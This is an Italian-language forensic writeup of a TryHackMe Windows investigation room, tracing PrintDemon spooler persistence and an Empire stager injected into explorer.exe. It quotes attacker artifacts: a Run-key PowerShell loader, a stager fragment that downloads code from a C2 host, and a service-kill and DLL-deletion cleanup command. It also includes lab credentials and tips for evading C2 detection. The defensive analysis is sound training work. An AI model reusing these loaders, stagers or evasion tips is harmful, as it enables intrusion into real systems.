---
layout: writeup
lang: it
permalink: /writeups/investigating-windows-3/
title: "Investigating Windows 3.x"
ref: investigating-windows-3
date: 2026-09-14
bare: true
platform: THM
os: Windows Server 2019
difficulty: Medium
series: thm-windows
tags: [win, dfir, sysmon, empire, printdemon, injection, procmon]
txt: /writeups-files/investigating-windows-3.txt
summary: "Due catene distinte sulla stessa macchina: persistenza sul Print Spooler in stile PrintDemon e uno stager Empire iniettato dentro explorer.exe."
---

# Writeup — Investigating Windows 3.x (TryHackMe)

OS: Windows Server 2019 (build 17763)
Difficoltà: Medium
Data: 14 settembre 2026

---

## Sommario

terza room della serie, host SysIntChallenge, trenta domande, zero exploitation: si entra in RDP come Administrator e si legge la macchina. la differenza con le prime due è che qui il grosso delle risposte non sta nei log nativi ma dentro Sysmon e dentro un Logfile.PML lasciato sul desktop, e che le catene da ricostruire sono due e distinte: un impianto di persistenza sul Print Spooler in stile PrintDemon/Faxhell, e uno stager Empire iniettato dentro explorer.exe.

mi ero dato un limite di trenta minuti di sessione. non li ho rispettati, e il motivo non è stato l'analisi ma il clipboard RDP che si piantava ogni due comandi. la parte investigativa vera, una volta impostato il metodo giusto, è filata

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco, spiegazione dettagliata di concetti tecnici e correzione di sintassi in comandi lunghi. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

per la semantica degli event ID di Sysmon e per le opzioni da riga di comando di Process Monitor ho fatto riferimento alla documentazione Microsoft:
https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

per il profilo di comunicazione di default di Empire e per il modulo di process injection:
https://bc-security.gitbook.io/empire-wiki
https://github.com/EmpireProject/PSInject

il SID dell'utente e altri identificativi macchina sono stati mascherati con asterischi in fase di pubblicazione dove non necessari.

---

## Premessa

Kali virtualizzata, RDP verso 10.114.130.250 con le credenziali della room, Administrator / blueT3aming!.

il problema numero uno di questa sessione non è stato tecnico ma di trasporto: rdpclip si piantava di continuo e la macchina non faceva né copiare né incollare. su una room dove devi spostare stringhe base64 da cinquemila caratteri quello è un blocco vero. il rimedio classico

taskkill /f /im rdpclip.exe & start rdpclip

funziona ma dura pochi minuti. la mia idea di renderlo persistente è stata la peggiore di tutta la sessione:

schtasks /create /tn rdpclipfix /tr "cmd /c taskkill /f /im rdpclip.exe & start rdpclip" /sc minute /mo 2 /ru Administrator /it /rl highest /f

perché ammazzare rdpclip ogni due minuti significa spaccare il canale proprio nell'istante in cui stai copiando. l'ho tolta appena capito

schtasks /delete /tn rdpclipfix /f
SUCCESS: The scheduled task "rdpclipfix" was successfully deleted.

ho provato anche a bypassare la clipboard montando la share amministrativa da Kali

sudo mount -t cifs //10.114.130.250/C$ /mnt/win -o username=Administrator,password='blueT3aming!',vers=3.0

ma su questa VPN non è passato e ho preferito non bruciarci altri minuti. il compromesso finale è stato riavviare rdpclip da PowerShell con attesa,e da lì in poi scrivere comandi che stampano poche righe per volta:

powershell -NoProfile -Command "Stop-Process -Name rdpclip -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Process -FilePath rdpclip.exe; Start-Sleep -Seconds 2; Get-Process rdpclip | Select-Object Id,SessionId"

Id SessionId
-- ---------
4528         2

due dettagli da mettere qui perché mi hanno fatto perdere tempo e non sono errori di sintassi. il primo: ogni tanto la riga incollata arrivava duplicata e il prompt rispondeva

'C:\Users\Administrator' is not recognized as an internal or external command

non c'è niente di sbagliato nel comando, è il paste che si è raddoppiato. il secondo: a metà sessione la variabile PATH della finestra cmd è saltata e sia findstr sia powershell risultavano "not recognized". si risolve chiamando l'eseguibile per path assoluto

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "..."

ultima cosa: la macchina è andata in saturazione di RAM più volte aprendo i file di log grossi, e ho dovuto riavviarla parecchie volte. le domande dalla 15 in poi le ho chiuse a pezzi, tra un riavvio e l'altro

---

## Fase 1 — Esportare i log prima di toccare qualunque altra cosa

prima cosa in assoluto, prima ancora di guardare il desktop. su una macchina lab i log ruotano e la sessione scade, quindi si porta tutto su file e poi si interroga il file, non il log vivo. wevtutil epl fa esattamente questo e non apre nessuna GUI.

powershell -NoProfile -Command "mkdir C:\ir -Force | Out-Null; 'Microsoft-Windows-Sysmon/Operational','System','Security','Microsoft-Windows-PrintService/Operational' | ForEach-Object { wevtutil epl $_ ('C:\ir\' + ($_ -replace '[/\\-]','_') + '.evtx') /ow:true }"

il primo tentativo l'avevo lanciato dentro cmd e ovviamente è morto:

'Out-Null' is not recognized as an internal or external command

era una pipeline PowerShell dentro un prompt cmd. banale, ma quando corri sono sessanta secondi buttati.

dai .evtx esportati ho poi tirato fuori i dump di testo che interrogo nelle fasi successive, uno per EventID, sempre filtrando lato server:

for %i in (1 3 7 8 13 22) do wevtutil qe C:\ir\Microsoft_Windows_Sysmon_Operational.evtx /lf:true /q:"*[System[(EventID=%i)]]" /f:text > C:\ir\ev%i.txt

i nomi che uso più avanti (reg13.txt, proc1.txt, net3.txt) sono quei file rinominati per leggibilità.

sul filtraggio ho sbattuto contro un limite vero di wevtutil: le query XPath con contains() non sono supportate

wevtutil qe ... /q:"*[System[EventID=13]][EventData[Data[@Name='TargetObject'] and (contains(Data,'Run'))]]"
This operator is unsupported by this implementation of the filter.
Failed to open event query.
The specified query is invalid.

quindi il pattern corretto è: XPath solo sull'EventID (lato server, veloce), dump su file di testo, e filtro sul contenuto lato PowerShell o findstr. non il contrario, perché Get-WinEvent con filtro client su un Security log da centomila eventi resta appeso.

---

## Fase 2 — La Run key che non contiene il payload

domande 1-5. dal dump degli EventID 13 ho tirato fuori tutti i TargetObject con "Run" dentro:

powershell -NoProfile -Command "Select-String -Path C:\ir\reg13.txt -SimpleMatch 'TargetObject:' | Select-String -SimpleMatch 'Run' | Select-Object -First 10 -ExpandProperty Line"

TargetObject: HKU\S-1-5-21-****\Software\Microsoft\Windows\CurrentVersion\Run\Updater
TargetObject: HKU\S-1-5-21-****_Classes\Autoruns.Logfile.1\shell\open\command\(Default)
TargetObject: HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\{ca72b496-****}

le altre due le ho scartate subito e vale la pena dire perché: la seconda è la registrazione della file association di Autoruns, cioè un artefatto di chi ha preparato la macchina o dell'analista che ci ha lavorato prima, la terza è un RunOnce con GUID tipico di un installer MSI. resta Run\Updater. contesto completo:

RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder
EventType: SetValue
UtcTime: 2021-01-22 01:08:13.468
ProcessGuid: {786593ca-776d-6009-4b00-000000000300}
ProcessId: 2684
Image: C:\Windows\Explorer.EXE
TargetObject: HKU\S-1-5-21-****-500\Software\Microsoft\Windows\CurrentVersion\Run\Updater
Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"

qui c'è il punto della domanda 1, e la risposta non è quella che verrebbe da dare di getto. la chiave di Run non contiene il payload, contiene un loader di due righe che va a leggere il payload da un'altra chiave. il blob base64 sta in

HKCU\Software\Microsoft\Windows\CurrentVersion\Debug

e da lato offensive questa è la cosa più interessante di tutta la prima metà della room. tenere il codice fuori dalla chiave di autorun ti dà due cose: la Run key resta corta e non salta all'occhio in una triage veloce, e il payload vero vive in un valore chiamato "Debug" sotto CurrentVersion, che sembra roba di sistema e nessuno apre. chi fa il controllo standard legge la Run, vede powershell -enc, e cerca il base64 lì dentro senza trovarlo.

l'altra cosa da segnare: il processo che scrive la chiave è Explorer.EXE, PID 2684. explorer che scrive una Run key con dentro un loader PowerShell è già di per sé la firma di un'injection, e infatti torna tutto nella fase 6

---

## Fase 3 — Primo payload decodificato

domande 6-9. il valore Debug è ancora nella hive, quindi si legge e si decodifica al volo. attenzione che è un valore, non una sottochiave: il primo tentativo è morto così

Cannot find path 'HKCU:\Software\Microsoft\Windows\CurrentVersion Debug' because it does not exist.

la forma giusta usa -Name:

powershell -NoProfile -Command "$x=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion' -Name Debug).Debug; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($x)) | Out-File C:\ir\payload.txt"

il decodificato è un blocco unico gigante senza a capo, quindi per leggerlo l'ho splittato sui punto e virgola invece di stamparlo:

powershell -NoProfile -Command "(gc C:\ir\payload.txt -Raw) -split '[;\r\n]+' | sls 'sc |port|kill|\.dll' | select -First 8"

$FTPPort = "9299"
$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)

servizio FTP, porta 9299. dentro lo stesso payload c'è un secondo blob base64 annidato, e quello contiene la parte distruttiva:

kill (Get-Process FXSSVC).Id -force; Remove-Item -path 'C:\Windows\System32\ualapi.dll'

FXSSVC è il servizio Fax e ualapi.dll è la DLL che quel servizio carica. la coppia è la firma di PrintDemon / Faxhell (CVE-2020-1048): si abusa del Print Spooler per far scrivere una DLL arbitraria dentro System32, poi il servizio Fax la carica come provider e ti ritrovi codice in esecuzione come SYSTEM. quello che vediamo qui è la coda della catena, cioè il cleanup: il payload ammazza il servizio e cancella la DLL piantata prima.

nello stesso decodificato compare anche il bypass AMSI, la solita SetValue su amsiInitFailed. l'ho annotato ma non serve a nessuna domanda

---

## Fase 4 — La stampante che non stampa niente

domande 10-13. qui sono partito male. avevo dato per scontato che "New Default Printer" fosse una entry di log e ho bruciato tre comandi:

findstr /i /n /c:"printer" C:\ir\system.txt C:\ir\print.txt

zero risultati, perché PrintService/Operational su questa macchina è sostanzialmente vuoto. ho girato la cosa e sono andato sulla hive utente, dove la default printer sta sempre:

reg query "HKU\S-1-5-21-****-500\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Device

    Device    REG_SZ    PrintDemon,winspool,Ne02:

stampante PrintDemon sulla porta Ne02:. e qui si incastra l'altro EventID 13 che avevo già nel dump:

RuleName: technique_id=T1547.010,technique_name=Boot or Logon Autostart Execution - Port Monitors
EventType: SetValue
UtcTime: 2021-01-26 17:55:34.983
ProcessId: 1940
Image: C:\Windows\System32\spoolsv.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\Ne02:
Details: (Empty)

T1547.010, port monitors: la porta viene registrata dallo spooler e diventa il canale con cui la DLL finisce dove non dovrebbe. il processo associato è spoolsv.exe.

sul log giusto per la domanda 10 ci sono arrivato solo dopo: non è System e non è Operational, è PrintService/Admin, ed è lo stesso record che nomina la nuova default printer

powershell -NoProfile -Command "Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PrintService/Admin'} | Select-Object -First 3 Id,TimeCreated,Message | Format-List"

Id : 823
Message : The default printer was changed to PrintDemon...

per il parent PID ho preso la via corta interrogando WMI sul processo vivo invece di scavare nel PML:

powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='spoolsv.exe'\" | Select-Object ProcessId,ParentProcessId"

ProcessId 1876, ParentProcessId 632, e 632 è services.exe. discrepanza da annotare: nell'evento Sysmon del 26 gennaio spoolsv aveva PID 1940, adesso ne ha 1876. sono sessioni diverse, la macchina è stata riavviata nel frattempo. il parent invece resta 632 perché lo spooler è sempre figlio di services.exe, ed è quello che chiede la domanda

---

## Fase 5 — Il secondo payload, cioè lo stager Empire

domande 14-18. il payload della Run key non è l'unico. cercando i process create con -enc:

powershell -NoProfile -Command "$c=Get-Content C:\ir\proc1.txt; for($i=0;$i -lt $c.Count;$i++){ if($c[$i] -match '\-enc'){ ($c[($i-6)..$i] | Where-Object {$_ -like '*ProcessId:*'}) + ' LEN=' + $c[$i].Length } }"

ProcessId: 3088  LEN=5197

cinquemila caratteri di base64 su una riga, e questa è la riga che il clipboard si rifiutava di darmi. l'ho decodificata direttamente sulla macchina invece di portarmela via, estraendo il blob con una regex e provando Unicode con fallback ASCII, perché a seconda di come è stato generato l'encoding cambia:

powershell -NoProfile -Command "$c=Get-Content C:\ir\proc1.txt; foreach($l in $c){ if($l -match '\-enc'){ $m=[regex]::Match($l,'[A-Za-z0-9+/=]{200,}'); $b=[Convert]::FromBase64String($m.Value); $s=[Text.Encoding]::Unicode.GetString($b); if($s -notmatch '[a-z]{4}'){ $s=[Text.Encoding]::ASCII.GetString($b) }; Set-Content C:\ir\enc2.txt $s -Encoding ASCII; break } }"

il primo giro con solo Unicode mi aveva restituito la stringa con uno spazio tra ogni carattere, cosa che sul momento mi aveva fatto pensare a un payload corrotto e invece era solo l'encoding sbagliato in lettura.

il decodificato è uno stager riconoscibile a occhio:

$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$ser=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAzADQALgAyADQANQAuADEAMgA4AC4AMQA2ADEAOgA5ADAAMAAxAA=='))
$t='/admin/get.php'
$27CE.Headers.Add('User-Agent',$u)
$27CE.PRoXY=[SysTem.NET.WEBREqUesT]::DEFAUlTWEBPROXY
$27CE.Headers.Add("Cookie","RjMeek=ZmQLHacMBXrLcB+VElvLcwO26EY=")
$DaTA=$27CE.DOwnloADdATA($Ser+$T)
$iv=$DaTA[0..3]; $DaTA=$dATA[4..$DAta.lENgth]

User-Agent fisso, cookie di sessione, path /admin/get.php, decrypt XOR/RC4 e IEX finale. il server dentro il base64 nel base64 è http://34.245.128.161:9001

/admin/get.php è il pezzo che identifica il framework: è uno dei tre endpoint del profilo di comunicazione di default di Empire. la variabile che contiene quel profilo nel listener si chiama DefaultProfile, e gli altri due path che ti aspetti nei log sono /news.php e /login/process.php. Empire su ATT&CK è S0363, quindi https://attack.mitre.org/software/S0363/

nota mia da lato offensive: il profilo di default di un C2 è la cosa più stupida che ti brucia in un red team. tre path fissi e uno User-Agent IE11 hardcoded significa che qualsiasi difesa con una regola scritta bene ti prende al primo beacon. la stessa infrastruttura con un profilo custom coerente col traffico dell'ambiente non lascia questo tipo di firma

---

## Fase 6 — Le connessioni e l'injection

domande 19-24. sugli EventID 3 ho raggruppato per IP di destinazione invece di leggerli uno a uno, perché sono centinaia:

powershell -NoProfile -Command "Get-Content C:\ir\net3.txt | Where-Object {$_ -like '*DestinationIp:*'} | Group-Object -NoElement | Sort-Object Count -Descending | Select-Object -First 10 Count,Name"

Count Name
----- ----
   25 DestinationIp: 10.60.0.230
   17 DestinationIp: 169.254.169.254
    8 DestinationIp: 0:0:0:0:0:0:0:1
    2 DestinationIp: 88.221.16.244
    2 DestinationIp: 10.10.83.237
    2 DestinationIp: 34.245.128.161
    2 DestinationIp: 93.184.220.29

qui ho sbagliato per primo a inseguire il conteggio più alto. 10.60.0.230 con 25 hit sono svchost e System, cioè traffico interno di rete AWS, e 169.254.169.254 è il metadata endpoint EC2, roba dell'infrastruttura non dell'attaccante. il volume non è un criterio, il processo lo è. rifiltrando per processo:

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp: 34.245.128.161 DestinationPort: 9001
Image: C:\Windows\explorer.exe DestinationIp: 34.245.128.161 DestinationPort: 9001

due processi, stessa destinazione, stessa porta 9001, la stessa che era dentro il base64 annidato dello stager. il DestinationHostname nei log è vuoto perché la connessione è andata direttamente su IP, ma la naming convention EC2 è deterministica e il DNS ce lo conferma: ec2-34-245-128-161.eu-west-1.compute.amazonaws.com. che tra l'altro combacia con la query DNS interna che avevo pescato negli EventID 22, _ldap._tcp.dc._msdcs.eu-west-1.compute.internal, stessa region.

il secondo processo è explorer.exe, PID 2684, cioè esattamente quello che aveva scritto la Run key nella fase 2. a questo punto il quadro è chiuso: powershell 3088 ha iniettato in explorer 2684. la conferma sta negli EventID 8:

UtcTime: 2021-01-22 01:07:06.182
SourceProcessId: 3088
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessId: 2684
TargetImage: C:\Windows\explorer.exe

CreateRemoteThread, event ID 8, prima occorrenza alle 01:07:06.182 UTC. nello stesso dump ci sono altri due EventID 8 da vmtoolsd.exe verso csrss.exe: quelli sono VMware Tools, li ho scartati perché il source è firmato e il pattern è quello normale dell'agent, non un'injection.

sequenza temporale che si ricompone da sola: injection alle 01:07:06, e la Run key scritta da explorer alle 01:08:13, un minuto e sette secondi dopo. prima entri nel processo, poi da dentro il processo pulito ti scrivi la persistenza. così la Run key risulta creata da explorer.exe e non da un powershell sospetto

---

## Fase 7 — Procmon e lo stack WMI

domande 22 e 25-30. sul desktop c'era Logfile.PML già pronto. la GUI su questa macchina è un rischio, quindi prima ho provato la conversione headless:

cmd /c "C:\Tools\Sysint\Procmon.exe /OpenLog C:\Users\Administrator\Desktop\Logfile.PML /SaveAs C:\ir\pml.csv /Quiet /AcceptEula"

funziona e ti dà un CSV interrogabile con Import-Csv. il primo record:

Time of Day  : 6:05:37.8916959 PM
Process Name : Sysmon.exe
PID          : 1308
Operation    : RegQueryKey
Path         : HKU
Result       : SUCCESS

qui c'è il ragionamento che sblocca tre domande insieme. la cattura copre 6:05:37 - 6:09:17 PM ora locale, mentre Sysmon logga in UTC e l'injection sta alle 01:07:06 del 22 gennaio. la macchina è su UTC-7, quindi 01:07:06 UTC del 22 sono le 6:07:06 PM del 21 in locale, cioè dentro la finestra di cattura. il valore sotto Date and Time è 1/21/2021 6:07:06 PM.

la prima operazione di explorer.exe da quel timestamp:

powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv | Where-Object {$_.PID -eq '2684' -and $_.'Time of Day' -like '6:07:0*PM'} | Select-Object -First 4 'Time of Day',Operation,Path | Format-List"

Operation : Thread Create

che è la sequenza canonica: il thread remoto creato dall'injection compare come Thread Create dentro il processo bersaglio. per arrivarci ho prima buttato fuori le prime dieci righe senza filtro sulle colonne e mi sono perso nell'output, il filtro sulla finestra oraria è quello che rende la cosa leggibile.

il primo image load di explorer in quella finestra l'ho preso dalla GUI perché con Sysmon non veniva fuori niente di utile (l'EventID 7 per PID 2684 mi restituiva wmiutils.dll, che è il caricamento WMI successivo, non il primo):

C:\Windows\System32\mscoree.dll

ed è coerente con tutto il resto: mscoree.dll è l'host del CLR, cioè .NET che viene caricato dentro explorer. explorer.exe non ha nessun motivo di caricare il runtime .NET durante l'uso normale, e questo è uno degli indicatori più puliti di managed code injection che si possano avere.

la ricognizione dell'attaccante si vede nella query di registro:

powershell -NoProfile -Command "Import-Csv C:\ir\pml.csv | Where-Object {$_.Path -like '*CurrentVersion\ProductId*'} | Select-Object -First 4 'Time of Day','Process Name',PID,Operation,Path,Result | Format-List"

Time of Day  : 6:05:49.8784612 PM
Process Name : wmiprvse.exe
PID          : 2964
Operation    : RegQueryValue
Path         : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId
Result       : BUFFER OVERFLOW

Time of Day  : 6:05:49.8784740 PM
Process Name : wmiprvse.exe
PID          : 2964
Operation    : RegQueryValue
Path         : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId
Result       : SUCCESS

il BUFFER OVERFLOW seguito da SUCCESS a distanza di microsecondi non è un errore, è il pattern normale di RegQueryValue: prima chiamata per farsi dire la dimensione del buffer, seconda con il buffer giusto. quella con SUCCESS è quella da aprire.

lo stack di quell'evento è la prova migliore di tutta la room:

<div class="writeup-image">
  <img src="/assets/writeups/iw3-procmon-stack.png" alt="Stack dell'evento RegQueryValue in Process Monitor">
  <div class="img-caption">Lo stack dell'evento: dal basso la chiamata RPC, poi wmiprvse.exe, il provider WMI e la query al registro</div>
</div>

si legge dal basso verso l'alto e racconta la catena completa: RPCRT4 e combase sotto (chiamata RPC in arrivo), poi wmiprvse.exe, poi framedynos.dll con CWbemProviderGlue::CreateInstanceEnumAsync, poi cimwin32.dll con CRegistry::GetCurrentKeyValue, e in cima KERNELBASE e ntoskrnl che fanno la query vera. tradotto: qualcuno ha chiesto informazioni di sistema via WMI, il provider WMI le ha risolte leggendo il registro, e l'accesso al registro risulta fatto da wmiprvse.exe e non dal processo dell'attaccante. è WMI usato come proxy per la ricognizione, che è il motivo per cui cercare "chi ha letto ProductId" guardando i processi sospetti non porta da nessuna parte.

l'ultimo modulo dello stack con risultato valido è ntdll.dll, frame 36, RtlUserThreadStart, cioè il fondo dello stack utente.

il modulo del framework usato tra i due processi è Invoke-PSInject, il modulo di process injection di Empire, che è esattamente quello che genera un CreateRemoteThread verso un processo legittimo e ci carica dentro il runtime managed. tecnica T1055.

---

## Catena completa

timeline ricostruita, orari UTC, macchina su UTC-7 per gli orari locali di Procmon.

2021-01-21 19:52:53  powershell.exe PID 3088 già attivo con attività di rete, è il processo che ospita lo stager
2021-01-22 01:07:06  CreateRemoteThread da powershell 3088 verso explorer.exe 2684 (Invoke-PSInject, T1055)
2021-01-22 01:07:06  (locale 1/21 6:07:06 PM) primo effetto dentro explorer: Thread Create
2021-01-22 01:07:0*  explorer carica mscoree.dll, cioè il CLR .NET dentro il processo shell
2021-01-22 01:07:09  explorer carica wmiutils.dll, inizia l'uso di WMI dal processo iniettato
2021-01-22 01:05-01:09  ricognizione via WMI: wmiprvse.exe 2964 interroga HKLM\...\CurrentVersion\ProductId
2021-01-22 01:08:13  explorer.exe 2684 scrive HKCU\...\CurrentVersion\Run\Updater (T1547.001)
                     il valore Run contiene solo un loader, il payload base64 va in ...\CurrentVersion\Debug
--                   beaconing verso ec2-34-245-128-161.eu-west-1.compute.amazonaws.com:9001
                     profilo Empire di default, /admin/get.php, UA IE11 hardcoded
2021-01-26 17:55:34  spoolsv.exe scrive HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ports\Ne02:
                     (T1547.010, port monitor) e la default printer diventa PrintDemon, evento 823
--                   catena PrintDemon/Faxhell: DLL scritta in System32 e caricata dal servizio Fax
--                   payload di cleanup: apre FTP su 9299, uccide FXSSVC, rimuove C:\Windows\System32\ualapi.dll

la logica dell'attaccante è a due livelli separati e questo è il motivo per cui la room ti confonde. il livello uno è Empire: injection in explorer, C2, ricognizione WMI, persistenza in Run. il livello due è PrintDemon: abuso dello spooler per privilege escalation a SYSTEM via provider del servizio Fax, con tanto di pulizia finale. sono due catene che condividono solo la macchina, e se provi a leggerle come una sola non torna niente.

la cosa che mi porto dietro dal lato offensive è la scelta del bersaglio dell'injection. explorer.exe è il processo perfetto perché è sempre vivo, è dell'utente interattivo, fa traffico di rete di suo e scrive nel registro utente di continuo. la Run key scritta da explorer non stona, se scritta da powershell sì. quello che tradisce tutto è mscoree.dll: explorer che carica il CLR è un'anomalia che non ha spiegazioni benigne, e nessuna delle tecniche usate qui riesce a nasconderla.

---

## Risposte della room

1.  HKCU\Software\Microsoft\Windows\CurrentVersion\Debug
2.  T1547.001
3.  Persistence, Privilege Escalation
4.  2021-01-22 01:08:13.468
5.  13, SetValue
6.  FTP
7.  9299
8.  FXSSVC
9.  C:\Windows\System32\ualapi.dll
10. 823
11. PrintDemon
12. spoolsv.exe
13. 632
14. 3088
15. /admin/get.php
16. Empire, DefaultProfile
17. /news.php, /login/process.php
18. https://attack.mitre.org/software/S0363/
19. ec2-34-245-128-161.eu-west-1.compute.amazonaws.com
20. explorer.exe
21. 2684
22. C:\Windows\System32\mscoree.dll
23. CreateRemoteThread, 8
24. 2021-01-22 01:07:06.182
25. 1/21/2021 6:07:06 PM
26. Thread Create
27. HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId
28. ntdll.dll
29. Invoke-PSInject
30. T1055

---

## Lezioni apprese

la prima lezione non è tecnica ed è quella che mi è costata di più: il canale di lavoro fa parte del problema. ho perso più tempo dietro a rdpclip che dietro all'analisi, e la mossa peggiore è stata automatizzare il fix senza pensare a cosa faceva quell'automazione mentre lavoravo. quando lo strumento di trasporto è instabile la risposta non è ripararlo in continuazione, è smettere di dipenderne: scrivere tutto in C:\ir e stampare tre righe per volta è quello che alla fine mi ha fatto finire la room.

la seconda è sui fusi orari. Sysmon logga UTC, Procmon logga ora locale, e la room ti chiede la stessa cosa in due formati diversi in due domande consecutive. senza calcolare l'offset della macchina la finestra della cattura PML sembra non contenere l'evento e ti convinci di avere il file sbagliato. l'offset lo ricavi dai dati stessi, confrontando due eventi che sai essere lo stesso.

la terza è sul volume come criterio. raggruppare gli EventID 3 per IP e inseguire il conteggio più alto mi ha portato dritto sul metadata endpoint AWS. su una macchina cloud il traffico rumoroso è quasi sempre infrastruttura, e la discriminante è il processo che apre la connessione, non quante volte la apre. due sole connessioni da explorer.exe valgono più di venticinque da svchost.

la quarta è che gli artefatti dell'analista sono ovunque. Autoruns.Logfile nelle chiavi, Procmon64.exe nel suo stesso stack, Sysmon.exe come primo record della cattura. su una macchina già analizzata da altri prima di te, metà di quello che sembra attività va attribuito a chi ci ha lavorato sopra, non all'attaccante.

sul lato tecnico, la cosa che mi resta è la ricognizione via WMI. non mi era chiaro prima di questa room che leggere il registro attraverso un provider WMI significa che l'accesso risulta fatto da wmiprvse.exe, con il tuo processo che non compare da nessuna parte nella colonna Process Name. per vederlo devi aprire lo stack, e lo stack esiste solo se hai una cattura Procmon. senza quel file quella parte della catena era invisibile

---

## Tool utilizzati

xfreerdp, RDP, wevtutil (epl, qe con XPath), PowerShell (Select-String -SimpleMatch, Import-Csv, [Convert]::FromBase64String, Get-CimInstance, Get-WinEvent -FilterHashtable), reg query, findstr /c:, Sysinternals Process Monitor (headless /OpenLog /SaveAs e GUI per la tab Stack), Sysmon (event ID 1, 3, 7, 8, 13, 22), Autoruns
